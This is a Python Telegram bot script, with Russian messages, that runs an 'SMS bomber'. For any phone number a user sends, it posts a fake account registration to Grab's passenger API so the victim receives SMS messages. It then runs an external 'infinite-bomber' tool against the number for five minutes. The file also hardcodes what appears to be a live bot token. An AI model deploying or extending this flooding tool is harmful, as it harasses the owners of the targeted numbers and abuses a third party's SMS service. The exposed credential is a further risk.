import requests
import time
import telebot
import subprocess
from threading import Thread


def bomber(number,id):
    zadergka=5
    print(requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': number,
                                                                                         'countryCode': 'ID',
                                                                                         'name': 'test',
                                                                                         'email': 'mail@mail.com',
                                                                                         'deviceToken': '*'}, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}))
    args = ['infinite-bomber', number, '1', '1', '30']
    s=subprocess.Popen(args)
    time.sleep(300)
    s.kill()
    msg='Флуд '+number+ ' закончен'
    bot.send_message(id,msg)
def th(number,id):
    msg = 'Флуд ' + number + ' начат'
    bot.send_message(id,msg)
    a=Thread(target=bomber,args=(number,id,))
    a.start()
bot = telebot.TeleBot('823977565:AAG64qC5F_DyCxl-qJC4U-ye2tyIMKM6eZY')
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, 'Приветствую в смс бобмере. Для запуска флуда просто отправте номер без +.')
@bot.message_handler(content_types=['text'])
def send_text(message):
    q = Thread(target=th,args=(message.text,message.chat.id) )
    q.start()
bot.polling()